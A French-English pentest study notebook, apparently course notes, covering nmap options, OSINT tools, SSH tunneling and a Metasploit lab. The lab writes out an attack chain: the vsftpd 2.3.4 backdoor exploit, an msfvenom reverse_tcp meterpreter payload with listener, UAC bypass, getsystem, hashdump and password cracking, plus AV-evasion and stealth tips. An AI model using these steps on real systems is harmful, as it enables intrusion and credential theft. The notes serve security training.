<p>UDP
<code>-sU</code> All ports en UDP (depricated)
<code>-sU -p 0-&gt;100</code> certains ports en UDP (best practice)</p>
</li>
<li>
<p>Output
<code>-O</code> OSF
<code>-vvv</code> Verbose
<code>-o [N|G|X] file_name</code> Sortie au format <code>N</code>ormal, <code>G</code>reppable ou <code>X</code>ML
<code>-o A file_name</code> Sortie pour toues les formats.</p>
</li>
</ul>
<p><code>-A</code> Scan Agressif [DEPRICATED]
<code>-sC</code> Scan sCript [DEPRICATED] script NSE
<code>-n</code> Pas de resolution DNS. Pas de demande d'enregistrement
<code>-T4</code> Temporisation =&gt; de 0(Paranoid) à 5 (Speed)
<code>-F</code> Fast Scan
<code>--top-ports</code> Les ports les plus conventionnels.</p>
<p><strong>note</strong> <code>keeplive</code> est accompagné de l'adresse IP du demandeur =&gt; DEPRICATED.</p>
<p><strong>note</strong> Comment être discret:</p>
<ul>
<li>
<p>Usurpe la MAC address</p>
</li>
<li>
<p>Modifier l'IP</p>
</li>
<li>
<p>Temporiser les rêquetes</p>
</li>
<li>
<p>Splitter les packets</p>
</li>
<li>
<p>Example: recherche de l'OS</p>
</li>
</ul>
<blockquote>
<p>nmap -sV -n 192.168.94.1 -p- -oX pcl.xml</p>
</blockquote>
<ul>
<li>Utilisation du port d'allocation dynamic (0)</li>
</ul>
<blockquote>
<p>nmap 192.168.94.1 -p 0</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="osint"><a class="header" href="#osint">OSINT</a></h1>
<p><a href="https://osintframework.com/">OSINT Framework</a></p>
<h2 id="tools-1"><a class="header" href="#tools-1">Tools</a></h2>
<style>
.badge_username {
  background-color: pink;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
  text: bold;
}
.badge_email {
  background-color: #3a87ad;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_ip_domain {
  background-color: purple;
  color: white;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_photo {
  background-color: yellow;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.badge_pseudo {
  background-color: orange;
  color: black;
  padding: 4px 8px;
  text-align: center;
  border-radius: 5px;
}
.bold-red {
    color: red;
    font-weight: bold;
}
</style>
<table>
    <thead>
        <tr>
            <th>Tools</th>
            <th>Tags</th>
            <th>Description</th>
        </tr>
    </thead>
    <tbody>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/sherlock-project/sherlock">Sherlock</a></td>
            <td>
                <span class="badge_username">Username</span>
            </td>
            <td>Scan les reseaux sociaux.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/megadose/holehe">Holehe</a></td>
            <td>
                <span class="badge_email">Email</span>
            </td>
            <td>Email check.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://www.shodan.io/">Shodan</a></td>
            <td>
                <span class="badge_ip_domain">Ip/Domain</span>
            </td>
            <td>Traque les objets connectes et leurs valeurs par defaut.</td>
        </tr>
        <!-- ITEM -->
        <tr>
            <td><a ref="https://www.whois.com/whois/osint.net">Whois</a></td>
            <td>
                <span class="badge_ip_domain">Ip/Domain</span>
            </td>
            <td>Carto. IP et Domaine.</td>
        </tr>
        <!-- ITEM -->
        <tr>
            <td><a ref="https://github.com/laramies/theHarvester">the Harverter</a></td>
            <td>
                <span class="badge_ip_domain">Ip/Domain</span>
                <span class="badge_username">Unsername</span>
            </td>
            <td>The harvester is another OSINT tool for reconnaissance.</td>
        </tr>
        <!-- ITEM -->
        <tr>
            <td><a ref="https://pimeyes.com/en">PimEyes</a></td>
            <td>
                <span class="badge_photo">Photo</span>
            </td>
            <td>Outil de recherche pour la reconnaissance faciale.</td>
        </tr>
        <!-- ITEM -->
        <tr>
            <td><a ref="https://betaface.com/demo.html">Betaface</a></td>
            <td>
                <span class="badge_photo">Photo</span>
            </td>
            <td>Outil de recherche pour la reconnaissance faciale.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://www.google.com">Google</a></br><a ref="https://yandex.com/">Yandex</a> <span class="bold-red">[UK]</span></br><a ref="https://www.bing.com/">Bings</a></td>
            <td>
                <span class="badge_username">Username</span>
                <span class="badge_email">Email</span>
                <span class="badge_ip_domain">Ip/Domain</span>
                <span class="badge_photo">Photo</span>
                <span class="badge_pseudo">Pseudo</span>
            </td>
            <td>Most populaire search gear.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://whatsmyname.app/">WhatsMyName</a></td>
            <td>
                <span class="badge_username">Username</span>
                <span class="badge_pseudo">Pseudo</span>
            </td>
            <td>Enumerate username.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/snooppr/snoop">Snoop <span class="bold-red">[UK]</span></a></td>
            <td>
                <span class="badge_username">Username</span>
                <span class="badge_pseudo">Pseudo</span>
            </td>
            <td>Check username and pseudo.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/smicallef/spiderfoot">Spiderfoot <span class="bold-red">[UK]</span></a></td>
            <td>
                <span class="badge_username">Username</span>
                <span class="badge_pseudo">Pseudo</span>
            </td>
            <td>Check username and pseudo.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://github.com/mxrch/GHunt">GHunt</a></td>
            <td>
                <span class="badge_email">Email</span>
            </td>
            <td>Extraire les infos. d'un compte Google.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://epieos.com/">Epieos</a></td>
            <td>
                <span class="badge_email">Email</span>
            </td>
            <td>Extraire les infos. d'un compte Google.</td>
        </tr>
        <!-- ITEM --> 
        <tr>
            <td><a ref="https://epieos.com/">Epieos</a></td>
            <td>
                <span class="badge_email">Email</span>
            </td>
            <td>Extraire les infos. d'un compte Google.</td>
        </tr>
    </tbody>
</table>
<h2 id="reconnaissance"><a class="header" href="#reconnaissance">Reconnaissance</a></h2>
<h3 id="site-de-recherche"><a class="header" href="#site-de-recherche">Site de recherche</a></h3>
<h4 id="people-search"><a class="header" href="#people-search">People Search</a></h4>
<ul>
<li>https://generated.photos</li>
<li>https://fr.fakenamegenerator.com</li>
<li>https://fr.fakepersongenerator.com</li>
<li>https://this-person-does-not-exist.com/fr</li>
</ul>
<h4 id="google-dorks"><a class="header" href="#google-dorks">Google Dorks</a></h4>
<p>Pour les <code>time:</code>, elle doit etre la valeur dans le calendrier Julien OU contenir explicitement la chaine de caractere.
Tous les operandes fonctionnent: &amp;, | &lt;, &gt; 
<code>index of ...</code> =&gt; &quot;index of &quot;</p>
<p><a href="https://www.exploit-db.com/google-hacking-database">GHDB (Google Hacking DataBase)</a> 
<a href="https://www.social-searcher.com/google-social-search/">Google Social Search</a></p>
<p>CSE exploité par Google (Google Custom Search Engine (CSE))</p>
<p><a href="https://start.me/p/EL84Km/cse-utopia?locale=fr">CSE Utopia</a> =&gt; list de CSE pre-generé</p>
<p>Generateur de DORKS =&gt; https://www.google.com/advanced_search</p>
<h4 id="recherche-dinformation-par-images"><a class="header" href="#recherche-dinformation-par-images">Recherche d'information par images</a></h4>
<p><a href="https://yandex.com/images">yandex</a></p>
<p><a href="https://osintfr.com/fr/accueil/">OSINT Framework</a>
<a href="https://lampyre.io/">lampire</a></p>
<p><a href="https://whoer.net/fr">Address IP</a></p>
<h2 id="training"><a class="header" href="#training">Training</a></h2>
<p><a href="https://osintfr.com">OSINT FR</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="penetration-testing---pentest"><a class="header" href="#penetration-testing---pentest">Penetration testing - Pentest</a></h1>
<h2 id="introduction-to-penetration-testing"><a class="header" href="#introduction-to-penetration-testing">Introduction to penetration testing</a></h2>
<p>Definitions:</p>
<ul>
<li><strong>Risk assessment</strong>: Analysis of services to identify vulnerabilities in systems, applications or processes.</li>
<li><strong>Penetration testing</strong>: Check if the vulnerabilities found are really present or not (false positives).</li>
</ul>
<h2 id="port-usuels"><a class="header" href="#port-usuels">Port usuels</a></h2>
<table><thead><tr><th>Port</th><th>Service</th></tr></thead><tbody>
<tr><td>21</td><td>ftp</td></tr>
<tr><td>22</td><td>ssh</td></tr>
<tr><td>23</td><td>telnet</td></tr>
<tr><td>25</td><td>smtp</td></tr>
<tr><td>53</td><td>domain</td></tr>
<tr><td>80</td><td>http</td></tr>
<tr><td>111</td><td>rpcbind</td></tr>
<tr><td>139</td><td>netbios-ssn</td></tr>
<tr><td>445</td><td>microsoft-ds</td></tr>
<tr><td>512</td><td>exec</td></tr>
<tr><td>513</td><td>login</td></tr>
<tr><td>514</td><td>shell</td></tr>
<tr><td>1099</td><td>rmiregistry</td></tr>
<tr><td>1524</td><td>ingreslock</td></tr>
<tr><td>2049</td><td>nfs</td></tr>
<tr><td>2121</td><td>ccproxy-ftp</td></tr>
<tr><td>3306</td><td>mysql</td></tr>
<tr><td>5432</td><td>postgresql</td></tr>
<tr><td>5900</td><td>vnc</td></tr>
<tr><td>6000</td><td>X11</td></tr>
<tr><td>6667</td><td>irc</td></tr>
<tr><td>8009</td><td>ajp13</td></tr>
</tbody></table>
<h2 id="reference-2"><a class="header" href="#reference-2">Reference</a></h2>
<ul>
<li><a href="https://ir0nstone.gitbook.io/notes">Binary Exploitation</a></li>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef">Introduction to x64 Linux Binary Exploitation</a></li>
</ul>
<h2 id="10-hacking-tools-in-kali-linux-you-must-know"><a class="header" href="#10-hacking-tools-in-kali-linux-you-must-know">10 Hacking Tools in Kali Linux You must know!</a></h2>
<p><a href="https://x.com/MeeraMystery/status/1792479677698736164">Reference @MeeraMystery</a></p>
<ol>
<li><a href="https://nmap.org/">Nmap</a> A powerful tool used for network scanning and security auditing. It can discover hosts, services, open ports and so much more!</li>
<li><a href="https://www.wireshark.org/">Wireshark</a> This is a network protocol analyzer. It lets you see what's happening on your network at a microscopic level.</li>
<li><a href="https://www.metasploit.com/">Metasploit</a>: A penetration testing framework that makes hacking simple. It's used for developing and executing exploit code against a remote target machine.</li>
<li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a>: A complete suite of tools to assess WiFi network security. It focuses on key areas of WiFi security like monitoring, attacking, testing, and cracking.</li>
<li><a href="https://www.openwall.com/john/">John the Ripper</a>: A fast password cracker. It's an essential tool in a hacker's arsenal, used for detecting weak passwords.</li>
<li><a href="https://portswigger.net/burp">Burp Suite</a>: A tool for testing web application security. It has a range of features, from intercepting proxy to automated scanning.</li>
<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>: A powerful brute force tool. It can perform rapid dictionary attacks against more than 50 protocols, including telnet, ftp, http, https, smb, and more.</li>
<li><a href="https://sqlmap.org/">SQLmap</a>: An open-source tool that automates the process of detecting and exploiting SQL injection flaws.</li>
<li><a href="https://www.zaproxy.org/">OWASP ZAP</a>: A free security tool for finding vulnerabilities in web applications. It's ideal for developers and functional testers as well as security experts.</li>
<li><a href="https://fr.tenable.com/products/nessus">Nessus</a>: A highly functional vulnerability scanner. It's capable of identifying vulnerabilities, configuration issues, and missing patches in a variety of systems.</li>
<li><a href="https://blog.stephane-robert.info/docs/outils/introduction/">Pentest Tools and Other</a>: Site that refers tools and all about pentest</li>
</ol>
<h2 id="documentation-ref-pentest"><a class="header" href="#documentation-ref-pentest">Documentation ref. pentest</a></h2>
<ul>
<li><a href="https://owasp.org/www-project-mobile-top-10/">OWASP Mobile Top 10</a></li>
<li><a href="https://mas.owasp.org/MASVS/">MASVS</a></li>
<li><a href="https://mas.owasp.org/MASTG/">MASTG</a></li>
<li><a href="https://mobile-security.gitbook.io/mobile-security-testing-guide/overview/0x03-overview">Introduction to the OWASP Mobile Application Security Project</a></li>
<li><a href="https://docs.fluidattacks.com/criteria/vulnerabilities/055/">FluidAttacks</a></li>
<li><a href="https://oversecured.com/vulnerabilities">oversecured/vulnerabilities</a></li>
<li><a href="https://developer.apple.com/documentation/security">Secu IOS</a></li>
<li><a href="https://developer.android.com/topic/security/best-practices">Secu Android</a></li>
<li><a href="https://developer.android.com/guide/platform?hl=fr">Architecture Android</a></li>
<li><a href="https://source.android.com/docs/core/runtime/dalvik-bytecode?hl=fr">Smali code</a></li>
<li><a href="https://developer.android.com/reference/android/Manifest.permission">Liste des permissions Android</a></li>
<li><a href="https://hackyx.io">Chercher des rapports de bug bounty</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="x64-linux-binary-exploitation"><a class="header" href="#x64-linux-binary-exploitation">x64 Linux Binary Exploitation</a></h1>
<h2 id="tutorial"><a class="header" href="#tutorial">Tutorial</a></h2>
<p><a href="https://x.com/0xor0ne">x64 Linux Binary Exploitation series - @0xor0ne</a></p>
<img src="pentest/BinaryExploitation/Linux/stack.jpeg" alt="isolated" width="50%"/>
<ul>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef">Basic</a></li>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465">Return into lib</a></li>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-3-rop-chains-3cdcf17e8826">RoP Chains</a></li>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-4-stack-canaries-e9b6dd2c3127">Stack Canaries</a></li>
<li><a href="https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-5-aslr-394d0dc8e4fb">ASLR</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="useful-commands"><a class="header" href="#useful-commands">Useful commands</a></h1>
<h2 id="http-serverone-line"><a class="header" href="#http-serverone-line">HTTP ServerOne line</a></h2>
<pre><code class="language-bash">python -m SimpleHTTPServer 8000 # Python 2.x

python -m http.server 8000 # Python 3.x

updog # pretty interface
</code></pre>
<h2 id="steganography"><a class="header" href="#steganography">Steganography</a></h2>
<p>Find images information</p>
<pre><code class="language-bash">identify -verbose
pngcheck [image]
zsteg [image] # detects stegano data hidden in PNG &amp; BMP


steghide extract -sf [filename]
stegseek [file] [wordlist] # bruteforce steghide passphrase
</code></pre>
<h2 id="web"><a class="header" href="#web">Web</a></h2>
<h3 id="attaque-sql"><a class="header" href="#attaque-sql">Attaque SQL</a></h3>
<pre><code class="language-bash">sqlmap -u &quot;http://172.16.128.39:8080/student_grade/index.php?student_id=&quot; --tables -D Dysto_School -T student
</code></pre>
<h3 id="website-request-command-line"><a class="header" href="#website-request-command-line">Website request command line</a></h3>
<pre><code class="language-bash">curl -v [url]
curl -v -X POST [url]
wget [url]
</code></pre>
<hr />
<h2 id="forensic-investigation"><a class="header" href="#forensic-investigation">Forensic Investigation</a></h2>
<pre><code class="language-bash">volatility
testdisk
</code></pre>
<h3 id="hidden-files-extraction"><a class="header" href="#hidden-files-extraction">Hidden files extraction</a></h3>
<pre><code class="language-bash">binwalk -e
</code></pre>
<h2 id="windows-1"><a class="header" href="#windows-1">Windows</a></h2>
<p>Find the Wi-Fi password using CMD</p>
<pre><code class="language-bash">netsh wlan show profile &lt;ESSID&gt; key=clear
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-secure-shell"><a class="header" href="#ssh-secure-shell">SSH (Secure SHell)</a></h1>
<h2 id="basic-connection"><a class="header" href="#basic-connection">Basic connection</a></h2>
<pre><code>ssh user@ip
</code></pre>
<blockquote>
<p>ssh user@192.168.0.46</p>
</blockquote>
<h2 id="file-transfert"><a class="header" href="#file-transfert">File transfert</a></h2>
<pre><code>scp [user@ip:]/full/file/path/src [user@ip:]/full/folder/path/dst
</code></pre>
<pre><code class="language-shell"># Upload (From local -&gt; remote)
$ scp /home/mickael/data/Ficher2 root@192.168.10.131:/var/www/
# Download (From remote -&gt; to local)
$ scp root@192.168.10.131:/var/www/Fichier2 /home/mickael/data/
</code></pre>
<h2 id="recurcive-copies"><a class="header" href="#recurcive-copies">Recurcive copies</a></h2>
<pre><code>scp -r [user@ip:]/full/root?folder/path/src [user@ip:]/full/folder/path/dst
</code></pre>
<blockquote>
<p>scp -r /home/mickael/data/ root@192.168.10.131:/var/www/</p>
</blockquote>
<h2 id="x11-forwarding"><a class="header" href="#x11-forwarding">X11 Forwarding</a></h2>
<p><img src="pentest/useful-commands/ssh/./assets/x11_forwarding.png" alt="img" /></p>
<ul>
<li>
<p>On server</p>
</li>
<li>
<p>In file <code>/etc/ssh/sshd_config</code></p>
</li>
</ul>
<pre><code class="language-shell">X11Forwarding yes
X11DisplayOffset 10
</code></pre>
<p><em>NOTE</em> Do not forget to reboot</p>
<blockquote>
<p>service sshd restart</p>
</blockquote>
<p><em>in progress</em></p>
<h2 id="tunneling"><a class="header" href="#tunneling">Tunneling</a></h2>
<p>We are going to match a local port of our machine to a remote port of the machine to which we are connecting, all through our SSH connection:</p>
<pre><code class="language-shell">$ ssh -f user@monserveur -L 2500:localhost:80 -N
</code></pre>
<ul>
<li><code>-f</code> to put command in foreground</li>
<li><code>-L</code> define <em>pathfinder</em> `local_port:target_tunnel_output:target_port_output_tunnel&quot;</li>
<li><code>-N</code> Do not execute e re;ote command</li>
</ul>
<p>For <code>-L</code>, here, the local port 2500 will represent the port 80 of ther remote.</p>
<p>Multiple SSH tunnels can be established at the same time, as long as they don't forward (match) the same ports. For example, here I have an active tunnel on my local port 2500, I can establish a second one on port 2501, to establish a connection with my local STMP server:</p>
<pre><code class="language-shell">$ ssh -f mickael@1.2.3.4 -L 2501:192.168.1.10:25 -N
</code></pre>
<h2 id="proxy-ssh"><a class="header" href="#proxy-ssh">Proxy SSH</a></h2>
<p><img src="pentest/useful-commands/ssh/./assets/proxy.jpg" alt="img" /></p>
<pre><code class="language-shell">$ ssh -D 12345 mickael@monserveur
</code></pre>
<h2 id="port-knocking"><a class="header" href="#port-knocking">Port knocking</a></h2>
<p><img src="pentest/useful-commands/ssh/./assets/port-knocking-ssh.png" alt="img" /></p>
<p>Use tools <code>knockd</code></p>
<pre><code class="language-shell">$ apt install knockd
</code></pre>
<p>Update config. file</p>
<ul>
<li>/etc/knockd.conf</li>
</ul>
<pre><code class="language-ini">[ouvrir_SSH]

sequence = 2005,1905,3005

seq_timeout = 20 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn

[fermer_SSH]

sequence = 3005,1905,2005

seq_timeout = 20

command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn
</code></pre>
<p><strong>IMPORTANT</strong> </p>
<p>Your server must have closed all unused ports beforehand. More simply with the command </p>
<pre><code>iptables -P INPUT DROP
</code></pre>
<p>which will have the effect of closing all the input ports. Be careful with this command all the same if you don't want to cut off your own access.</p>
<h2 id="ref-2"><a class="header" href="#ref-2">Ref.</a></h2>
<ul>
<li><a href="https://www.it-connect.fr/cours/comprendre-et-maitriser-ssh/">Comprendre et maîtriser SSH</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h1>
<ul>
<li>Deploit, periste et nettoie les traces.</li>
<li>Developper en Ruby</li>
<li>Manger le livre =&gt; Metasploit by HD Moore.</li>
<li>Outil de pentest</li>
<li>Open-Source en <code>Ruby</code></li>
</ul>
<p>Anecdote:</p>
<p>En 2003 envoit des requetes <code>AxA * 20000</code> sur le reseau sous XP.</p>
<p>Sociéte de conception de <code>Nexpose</code> (Rapid7) qui veut racheter le framework.</p>
<h2 id="architecture"><a class="header" href="#architecture">Architecture</a></h2>
<h2 id="librairies"><a class="header" href="#librairies">Librairies</a></h2>
<p>MFS Core; MSF Base et Rex</p>
<h2 id="interfaces"><a class="header" href="#interfaces">Interfaces</a></h2>
<ul>
<li>
<p>MsfGui (Win7) - version graphique de Msf [DEPRICATED]</p>
</li>
<li>
<p>MsfConsole - Interface de commande. Controleur de charge</p>
</li>
<li>
<p><del>Msfcli</del> =&gt; MsfVenom - permet de generer et packer les charges. Createur des charges</p>
</li>
<li>
<p>MsfWeb - DEPRICATED</p>
</li>
<li>
<p>Metasploit Pro - <code>Hack as a cli</code> qui permet de gerer les attaques</p>
</li>
<li>
<p>Armitage - Existe depuis <code>BackTrack 3</code>, supprimé dans Kali mais toujours opérationnel. Controle graphic des charge/control </p>
</li>
<li>
<p>Colbalt Strike - Version elegante de<code>Armitage</code></p>
</li>
<li>
<p>Kage - Other Armitage ou RAT (Remote Administration Threat)</p>
</li>
</ul>
<p><code>Kage</code> <code>Armiteg</code> et <code>Cobalt Strik</code> exploit<code>Msfconsole</code>.</p>
<h2 id="msfconsole"><a class="header" href="#msfconsole">MsfConsole</a></h2>
<blockquote>
<p>msfconsol</p>
</blockquote>
<p>La console est connecter à une DB posgres.
On doit faire un update puis lancer les DB pour avoir une sync des vuln.</p>
<h3 id="auxiliary"><a class="header" href="#auxiliary">Auxiliary</a></h3>
<p>Modules <strong>autre</strong> que ceux de l'attaque. Post exploitation.</p>
<p>Ex: scanner<code>UDP_sweep</code> </p>
<ul>
<li>Enumeration</li>
<li>Sniffing</li>
<li>Fuzzing =&gt; stress d'application avec des parametres pour essayer de genere un autre comportement. Un crash ne signifit pas la prise ou l'elevation de privilège.</li>
</ul>
<p>Example d'application : <code>Winaf</code></p>
<h3 id="post"><a class="header" href="#post">post</a></h3>
<p>Permet la post-exploitation: persistances, pivoting, utilise les auxiliary module....</p>
<h3 id="exploit"><a class="header" href="#exploit">Exploit</a></h3>
<p>Codes qui va exploiter des vuln. Ils sont packagés dés qu'ils sont connus. Reproduit une vuln.</p>
<p><strong>ATTENTION</strong> Un exploit n'est pas une prise de controle. On peut utiliser un exploit pour lancer un Ransomware, un DDOS....</p>
<pre><code>Un exploit est un bout de code qui exploite une faille =&gt; automatise la reproduction d'une vuln.
</code></pre>
<h3 id="payload"><a class="header" href="#payload">payload</a></h3>
<p>Avec un exploit, ne permet pas le controle. C'est la charge mailicieuse embarque dans l'exploit pour definit comment communiquer avec l'exploitant, le tunnel.</p>
<ol>
<li>
<p>Le payload peut avoir 2 directions:</p>
<ol>
<li>Hacker vers la cible =&gt; BIND payload</li>
<li>Cible vers hacker =&gt; REVERSE payload (Protocole HTTP; HTTPS, DNS, Mail...)</li>
</ol>
</li>
<li>
<p>Les parametres:</p>
<p>1.[Cible/Host]</p>
<ul>
<li>remotre address =&gt; RHOST (ex: 192.168.2.1)</li>
<li>remote port =&gt; RPORT (ex: Port 21)</li>
</ul>
<p>2.[Hacker]</p>
<ul>
<li>Local address =&gt; LHOST</li>
<li>Local port =&gt; LPORT</li>
</ul>
</li>
<li>
<p>Execution de <code>shell</code></p>
</li>
</ol>
<p>Execution du shell sur le victime =&gt; <code>Meterpreter</code></p>
<p>Le canal de communication avec le <code>Meterprete</code> fait de l'obfuscation en assembleur.</p>
<p><strong>WARNING</strong> le Meterpreter est detecté par tous AV/IDS/IPS.</p>
<h3 id="encoder"><a class="header" href="#encoder">Encoder</a></h3>
<p>L'obfuscation permet de passer les AV. Cela, MSF fait de l'encodage (chiffrement, XOR....)</p>
<ol>
<li>Quelques examples </li>
</ol>
<ul>
<li>
<p><code>Shikata Ga Nai</code> Best chiffrement</p>
</li>
<li>
<p><code>NOP</code> Pas d'opération en assembleur (0x90). Cela permet de créer du vide et de stabiliser une charge. Connu sous le nom de traineau de vide.</p>
</li>
</ul>
<h3 id="evasion"><a class="header" href="#evasion">Evasion</a></h3>
<p>Nouveau module permettant de faire des exploit d'evaion???</p>
<h2 id="tp-1---vuln"><a class="header" href="#tp-1---vuln">TP 1 - Vuln.</a></h2>
<h3 id="init"><a class="header" href="#init">Init</a></h3>
<pre><code class="language-shell">$ sudo -s
$ service postgresql start                        
$ service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Thu 2022-06-23 11:16:39 CEST; 19s ago
    Process: 741661 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 741661 (code=exited, status=0/SUCCESS)
        CPU: 4ms

juin 23 11:16:39 Ptes systemd[1]: Starting PostgreSQL RDBMS...
juin 23 11:16:39 Ptes systemd[1]: Finished PostgreSQL RDBMS.
$ msfdb init
$ msfconsole

msf6 &gt; 
</code></pre>
<ul>
<li>Command <code>show</code>
`</li>
</ul>
<blockquote>
<p>show encoders</p>
</blockquote>
<blockquote>
<p>show evasion</p>
</blockquote>
<ul>
<li>Commande disponible</li>
</ul>
<blockquote>
<p>?</p>
</blockquote>
<h3 id="search"><a class="header" href="#search">search</a></h3>
<p>Permet de chercher des exploits, payloads par rapport aux vuln ou autre.</p>
<pre><code class="language-bash">$ search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
</code></pre>
<p>La doc annonce:</p>
<ul>
<li><code>info exploit/unix/ftp/vsftpd_234_backdoor</code> pour information</li>
<li><code>use exploit/unix/ftp/vsftpd_234_backdoor</code> pour activer l'utilisation</li>
</ul>
<p><code>OSVDB</code> Open-Source VulN DataBase qui est une base de données Open-Source de ExploitDB, pas toujours à jours.</p>
<h3 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h3>
<pre><code class="language-bash">msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                      Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 192.168.2.1
RHOSTS =&gt; 192.168.2.1
</code></pre>
<p><code>options</code> permet d'avoir les info.
Les payload sont dependents de l'Exploit.</p>
<blockquote>
<p>set payload cmd/unix/interact</p>
</blockquote>
<p>C'est le seul proposé pour cet exploit.</p>
<ul>
<li>Execute l'exploit en interfactive =&gt; une <code>session</code></li>
</ul>
<blockquote>
<p>exploit</p>
</blockquote>
<ul>
<li>Execute en tache de fond</li>
</ul>
<blockquote>
<p>exploit -j</p>
</blockquote>
<ul>
<li>list des sessions en cours</li>
</ul>
<blockquote>
<p>sessions</p>
</blockquote>
<ul>
<li>list des jobs en cours</li>
</ul>
<blockquote>
<p>jobs</p>
</blockquote>
<ul>
<li>Switch session</li>
</ul>
<blockquote>
<p>sessions sessionID</p>
</blockquote>
<ul>
<li>Quitter Session</li>
</ul>
<blockquote>
<p>abort sessions</p>
</blockquote>
<h3 id="msfvenom"><a class="header" href="#msfvenom">MSFVenom</a></h3>
<ul>
<li>Create charge</li>
</ul>
<blockquote>
<p>mfsvenom -p windows/meterpreter/reverse_tcp -f exe -o mous.exe</p>
</blockquote>
<ul>
<li>Lancement du listner</li>
</ul>
<blockquote>
<p>msf6 &gt; use multi/handler
msf6 expoit(multi/handler) &gt; set LHOST 192.168.2.5
msf6 expoit(multi/handler) &gt; set LPORT 9090</p>
</blockquote>
<p>Lorsque msf est contacté, prendre la session:</p>
<blockquote>
<p>session ID
? </p>
</blockquote>
<p><strong>WARNING</strong>  Evtx Event LOG de clean de log =&gt; 104</p>
<p>Il faut toujours detacher le meterpreter de la payload:</p>
<blockquote>
<p>ps &lt;= visualisation des Process &quot;Client-PC/Client&quot;</p>
</blockquote>
<p>Deplacement en memoire</p>
<blockquote>
<p>migrate PROCESSID_SAME_RIGHT</p>
</blockquote>
<p><strong>NOTE</strong> <code>voldiff.py</code> permet de retrouver par diff le process, pas nativement avec <code>volatilit</code>.</p>
<ul>
<li>Mettre en pause la session pour revenir sur Metasploit</li>
</ul>
<blockquote>
<p>bg</p>
</blockquote>
<ul>
<li>Monter les privilèges sous Windows (UAC)</li>
</ul>
<blockquote>
<p>search uac
use exploit/windows/local/bypassuac
options</p>
</blockquote>
<p><strong>WARNING</strong> <code>4444</code> est un port specific à Metasploit</p>
<ul>
<li>Elevation de privilège (UAC)</li>
</ul>
<blockquote>
<p>getprivs</p>
</blockquote>
<ul>
<li>Get system privilege</li>
</ul>
<blockquote>
<p>getsystem</p>
</blockquote>
<ul>
<li>Recupere la SAM</li>
</ul>
<blockquote>
<p>hashdump</p>
</blockquote>
<ul>
<li>Crack password</li>
</ul>
<blockquote>
<p>john sam.txt --format=nt --show</p>
</blockquote>
<ul>
<li>Comment charger des commandes exploitatble en Meterpreter:</li>
</ul>
<blockquote>
<p>load MODULE</p>
</blockquote>
<p>ex de Mimikatz:</p>
<blockquote>
<p>load kiwi</p>
</blockquote>
<h2 id="note-tp"><a class="header" href="#note-tp">Note TP</a></h2>
<pre><code class="language-shell">┌──(root💀Ptes)-[/home/stage]
└─# msfconsole                                                                                                  1 ⨯
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                                                             
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                           
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                          
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                         
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                                                         
